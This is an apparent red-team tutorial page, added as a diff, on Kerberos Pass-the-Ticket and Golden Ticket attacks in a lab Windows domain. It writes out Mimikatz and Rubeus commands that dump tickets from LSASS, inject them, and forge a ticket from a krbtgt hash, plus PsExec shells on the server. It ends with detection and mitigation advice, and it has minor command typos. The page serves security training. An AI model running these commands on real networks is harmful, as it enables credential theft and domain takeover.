@@ -1,0 +1,110 @@
+<style>:root{--bg-color:#121212;--text-color:#ffffff;--accent-red:#ff4d4d;--accent-purple:#bb86fc;--secondary-color:#03dac6;--card-bg:#1e1e1e;--code-bg:#2d2d2d;--border-color:#333}body{background-color:var(--bg-color);color:var(--text-color);font-family:"Segoe UI",Roboto,Oxygen,Ubuntu,Cantarell,"Open Sans","Helvetica Neue",sans-serif;line-height:1.6;margin:0;padding:20px;max-width:1200px;margin:0 auto}.post-content{background-color:var(--card-bg);border-radius:8px;padding:30px;box-shadow:0 4px 6px rgba(0,0,0,0.3);margin-bottom:30px;color:var(--text-color) !important}h1,h2,h3,h4{color:var(--accent-purple);margin-top:1.5em}h3 span{color:var(--accent-red) !important}a{color:var(--secondary-color);text-decoration:none}a:hover{text-decoration:underline}pre,code{background-color:var(--code-bg);border-radius:4px;padding:2px 4px;font-family:Consolas,Monaco,"Andale Mono",monospace;color:#f8f8f2}pre{overflow-x:auto;padding:15px;border-left:3px solid var(--accent-purple)}img{max-width:100%;height:auto;display:block;margin:20px auto;border:1px solid var(--border-color)}ul,ol{padding-left:20px}li{margin-bottom:8px}.post-date,.post-cats{color:#aaa;font-size:0.9em;margin-bottom:20px}span,p{color:inherit !important}span[style*="color: #800000"]{color:var(--accent-red) !important}</style>
+<div class="post-content">
+            <div class="post-cats">
+                <span class="cat-links"><a href="https://www.hackingarticles.in/category/red-teaming/lateral-movement/" rel="category tag">Lateral Movement</a>, <a href="https://www.hackingarticles.in/category/red-teaming/" rel="category tag">Red Teaming</a></span>            </div>
+            <h1 class="post-title entry-title">Lateral Movement: Pass the Ticket Attack</h1>            <div class="post-date">
+                                    <div class="entry-meta">
+                        <span class="posted-on"><a href="https://www.hackingarticles.in/lateral-movement-pass-the-ticket-attack/" rel="bookmark"><time class="entry-date published" datetime="2020-05-27T13:12:22+00:00">May 27, 2020</time><time class="updated" datetime="2025-05-11T21:05:10+00:00">May 11, 2025</time></a></span><span class="post_by"> by <span class="author vcard"><a class="url fn n" href="https://www.hackingarticles.in/author/raj/">Raj</a></span></span>                    </div><!-- .entry-meta -->
+                            </div>
+
+            <div class="content post-excerpt entry-content clearfix">
+                <p><span style="color: #000000;">After working on Pass the Hash attack and Over the pass attack, it’s time to focus on a similar kind of attack called Pass the Ticket attack. It is very effective and it punishes too if ignored. Let’s look into it.</span></p>
+<h3><span style="color: #800000;">Table of Content</span></h3>
+<ul>
+<li><span style="color: #000000;"><strong>Introduction</strong></span></li>
+<li><span style="color: #000000;"><strong>Configurations used in Practical</strong></span></li>
+<li><span style="color: #000000;"><strong>Working</strong></span></li>
+<li><span style="color: #000000;"><strong>Pass-the- Hash v/s Pass-the-Ticket</strong></span></li>
+<li><span style="color: #000000;"><strong>Pass-the-Ticket Attacks</strong></span>
+<ul>
+<li><span style="color: #000000;">Extracting Tickets: Mimikatz</span></li>
+<li><span style="color: #000000;">Passing the Ticket: Mimikatz</span></li>
+<li><span style="color: #000000;">Extracting Tickets: Rubeus</span></li>
+<li><span style="color: #000000;">Passing the Ticket: Rubeus</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Practical Approach: Golden Ticket Attack</strong></span></li>
+<li><span style="color: #000000;"><strong>Detection </strong></span></li>
+<li><span style="color: #000000;"><strong>Mitigation</strong></span></li>
+</ul>
+<h3><span style="color: #000000;"><span style="color: #800000;">Introduction</span></span></h3>
+<p><span style="color: #000000;">The articles series for Lateral Movement which includes techniques below are not the only way to further compromise the target Windows Server. There are other methods as well. </span><span style="color: #000000;">One such way was discovered while I was trying to perform the Lateral Movement on the Windows Server from Kali Linux. The surprise was that I didn’t hear about this attack and even the Mimikatz supports it. So, I looked around to find that there is not much written about it. This attack is known as the Pass-the-Ticket attack, and it allows an attacker to steal Kerberos credentials from a Linux system, such as Kali Linux. Subsequently, the attacker can use these stolen credentials to authenticate on a Windows machine.</span></p>
+<h3><span style="color: #800000;">Configurations used in Practical</span></h3>
+<p><span style="color: #000000;"><strong>Attacker Machine</strong></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>OS:</strong> Kali Linux 2020.2</span></li>
+<li><span style="color: #000000;"><strong>IP Address: </strong>192.168.1.112</span></li>
+</ul>
+<p><span style="color: #000000;"><strong>Target Machine</strong></span></p>
+<ul>
+<li><span style="color: #000000;"><strong>Server</strong></span>
+<ul>
+<li><span style="color: #000000;"><strong>OS:</strong> Windows Server 2016</span></li>
+<li><span style="color: #000000;"><strong>IP Address: </strong>192.168.1.105</span></li>
+<li><span style="color: #000000;"><strong>Domain: </strong>local</span></li>
+<li><span style="color: #000000;"><strong>User:</strong> Administrator</span></li>
+</ul>
+</li>
+<li><span style="color: #000000;"><strong>Client</strong></span>
+<ul>
+<li><span style="color: #000000;"><strong>OS:</strong> Windows 10</span></li>
+<li><span style="color: #000000;"><strong>IP Address: </strong>192.168.1.106</span></li>
+<li><span style="color: #000000;"><strong>User:</strong> Yashika</span></li>
+</ul>
+</li>
+</ul>
+<h3><span style="color: #000000;"><span style="color: #800000;">Working</span></span></h3>
+<p><span style="color: #000000;">In this attack, the attacker extracts the Kerberos Ticket Granting Ticket which is also known as TGT. It is located inside the LSASS process in the memory of the system. After extracting the ticket the attacker uses the ticket on another system to gain the access.</span></p>
+<h3><span style="color: #800000;">Pass-the-Hash v/s Pass-the-Ticket</span></h3>
+<p><span style="color: #000000;">The major difference between the Pass-the-Ticket and Pass-the-Hash attacks lies in the duration for which access can be acquired. Specifically, Kerberos TGT tickets have an expiration time of 10 hours, although this setting can be modified. In contrast, the Pass-the-Hash attack remains effective indefinitely, as it only expires when the user changes their password.  </span></p>
+<h3><span style="color: #800000;">Extracting Tickets: Mimikatz</span></h3>
+<p><span style="color: #000000;">As discussed before the tickets are loaded inside the memory and to extract them we will be using the mimikatz. We run the keberos::list command in mimikatz to read the tickets that are located in the LSASS. To save them on the machine we will use the /export parameter.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::list
+kerberos::list /export</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-dIQd37ljytw/Xs5lWXpDTMI/AAAAAAAAkU4/e8GXZyQutTUXjCVU2nE_uv63iFA9pEG6ACLcBGAsYHQ/s1600/1.png"/></span></p>
+<p><span style="color: #000000;">As we can see that we have the tickets that were saved inside the directory where we had the mimikatz executable. In the previous image, we can see that we have 2 tickets and the names of those tickets can be confirmed. For a sense of simplicity, we renamed one of the tickets as ticket.kirbi.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-UdylR2AozBM/Xs5lWSeIAoI/AAAAAAAAkU8/SWxlTx37GHEVKq1oOxzcXbzAHvMcYPVkgCLcBGAsYHQ/s1600/2.png"/>       </span></p>
+<h3><span style="color: #800000;">Pass-the-Ticket Attacks</span></h3>
+<h3><span style="color: #800000;">Passing the Ticket: Mimikatz</span></h3>
+<p><span style="color: #000000;">Now Mimikatz doesn’t just give up after extracting the tickets. It can pass the tickets as well. This is the reason I prefer mimikatz. We go back to the mimikatz terminal. Here, we pass the ticket with the help of ptt module inside the Kerberos module followed by the name of the ticket that we want to pass. This is the reason we renamed the ticket. Now that we have successfully passed the ticket. Now to perform the actions as the user that we passed the ticket for we decided to get a cmd as that user. This can be accomplished using the misc::cmd command as shown in the image given below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">kerberos::ptt ticket.kirbi
+misc::cmd</pre>
+<p><span style="color: #000000;"><img fetchpriority="high" decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-m824Se96I6s/Xs5lWJF4w1I/AAAAAAAAkU0/HJN8URXQiXYqcVNCRTVu-lYwg6O44CecwCLcBGAsYHQ/s1600/3.png" alt="Pass the Ticket Attack for Lateral Movement" width="656" height="286"/></span></p>
+<h3><span style="color: #800000;">Extracting Tickets: Rubeus</span></h3>
+<p><span style="color: #000000;">First, we will use extract the tickets using Rubeus. This can be done with the help of the asktgt module. Although it is not so sneaky method it gets the work done. We need the domain name, User, Password Hash. When used normally will give the base64 encoded TGT ticket. But Let’s Pass the Ticket as well in the same step. For this, I will just give the /ptt parameter at the end as shown in the image given below. </span></p>
+<p><span style="color: #000000;">Rubeus will ask the user for a TGT ticket and after receiving the ticket it encodes the ticket in Base64 and saves the ticket. Since I used the /ptt parameter as well, it will pass the ticket in the current session as well. When the ticket is passed, we can perform the actions as the user we passed the ticket for. Here we take a look at the directories of the said user.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Rubeus.exe asktgt /domain:ignite.local /user:Administrator /rc4: 32196b56ffe6f45e294117b91a83bf38 /ptt
+dir \\WIN-S0V7KMTVLD2\c$</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/-LhMD1XBZfqU/Xs5lXjj8XAI/AAAAAAAAkVA/D_a6UpN4BF0Ahrukaen_zmrw2999ZY4CACLcBGAsYHQ/s1600/4.png" alt="Pass the Ticket Attack for Lateral Movement" width="1018" height="1014"/></span></p>
+<h3><span style="color: #800000;">Passing the Ticket: Rubeus</span></h3>
+<p><span style="color: #000000;">If we don’t pass the ticket in the current session then we can use the ptt parameter separately and pass the ticket as the parameter as shown in the image given below. After successfully passing the ticket, we can use the ticket. For this, we decided to get a cmd session of the user we passed the ticket for. We will be using the PsExec64.exe as shown in the image given below.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">Rubeus.exe ptt /ticket:ticket.kirbi
+PsExec.exe \\192.168.1.105 cmd.exe
+ipconfig</pre>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-SaGINMRLQ3Y/Xs5lXlXRcQI/AAAAAAAAkVE/3vmEFxwYMQcE1tW3AYPglc9k2vC0VhXFwCLcBGAsYHQ/s1600/5.png"/></span></p>
+<h3><span style="color: #800000;">Practical Approach: Golden Ticket Attack</span></h3>
+<p><span style="color: #000000;">Golden Ticket Attack is also a good example of the Pass the Ticket Attack. Let’s take a look at it. Mimikatz allows the attacker to create a forged ticket and simultaneously pass the TGT to KDC service to Get TSG and enable the attacker to connect to Domain Server. Run both commands on cmd as an administrator.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">privilege::debug
+kerberos::golden /user:pavan /domain:ignite.local /sid:S-1-5-21-3523557010-2506964455-2614950430 /krbtgt:f3bc61e97fb14d18c42bcbf6c3a9055f /id:500 /ptt
+msic::cmd</pre>
+<p><span style="color: #000000;">The above command will generate the ticket for impersonate user with RID 500.</span></p>
+<p><span style="color: #000000;"><img decoding="async" src="https://1.bp.blogspot.com/-omubPCNM3V8/Xs5lXzZoGiI/AAAAAAAAkVI/Ng2epU8Mt90_FqjF_jtDflO0rXCUDwNMgCLcBGAsYHQ/s1600/6.png"/></span></p>
+<p><span style="color: #000000;">As soon as I ran the above-mentioned commands the attacker gets a new cmd prompt which allows the attacker to connect with Domain Server using PsExec.exe as shown in the below image.</span></p>
+<pre class="EnlighterJSRAW" data-enlighter-language="generic">PsExec64.exe \\192.168.1.105 cmd.exe
+ipconfig</pre>
+<p><span style="color: #000000;"><img decoding="async" class="alignnone" src="https://1.bp.blogspot.com/--aR7wOzk3yw/Xs5lYtX3nuI/AAAAAAAAkVM/9PGN1qXTZbYhGrjKbOiEwDPRlGWku2YggCLcBGAsYHQ/s1600/7.jpg" alt="Pass the Ticket Attack for Lateral Movement" width="623" height="540"/></span></p>
+<h3><span style="color: #000000;"><span style="color: #800000;">Detection</span></span></h3>
+<ul>
+<li><span style="color: #000000;">First, audit all Kerberos authentication and credential use events, and then review them for any discrepancies. Additionally, unusual remote authentication events that coincide with other suspicious activities, such as writing and executing binaries, may signal malicious intent.</span></li>
+<li><span style="color: #000000;">Furthermore, when using a golden ticket after the KRBTGT password has been reset twice, the Domain Controller generates Event ID 4769. In this case, the status code 0x1F indicates that the action failed due to an “Integrity check on decrypted field failed,” which strongly suggests misuse by a previously invalidated golden ticket.</span></li>
+</ul>
+<h3><span style="color: #800000;">Mitigation</span></h3>
+<ul>
+<li><span style="color: #000000;">To further contain the impact of a previously generated golden ticket, you should reset the built-in KRBTGT account password twice. This action will effectively invalidate any existing golden tickets created using the KRBTGT hash, as well as other Kerberos tickets derived from it.</span></li>
+<li><span style="color: #000000;">Ensure that local administrator accounts have complex, unique passwords.</span></li>
+<li><span style="color: #000000;">Limit domain admin account permissions to domain controllers and limited servers. Delegate other admin functions to separate accounts.</span></li>
+<li><span style="color: #000000;">Do not allow a user to be a local administrator for multiple systems.</span></li>
+</ul>
+<p><span style="color: #000000;">To learn more about Lateral Movement Techniques. Follow this <strong><a href="https://www.hackingarticles.in/tag/lateral-movement/">Link.</a></strong></span></p>
+<p><span style="color: #000000;"><strong>Author: Pavandeep Singh</strong> is a Technical Writer, Researcher and Penetration Tester. Contact on <span style="color: #0000ff;"><strong><a style="color: #0000ff;" href="https://www.linkedin.com/in/pavan2318/">LinkedIn</a></strong></span></span></p>
+<div class="yarpp yarpp-related yarpp-related-website yarpp-template-thumbnails">
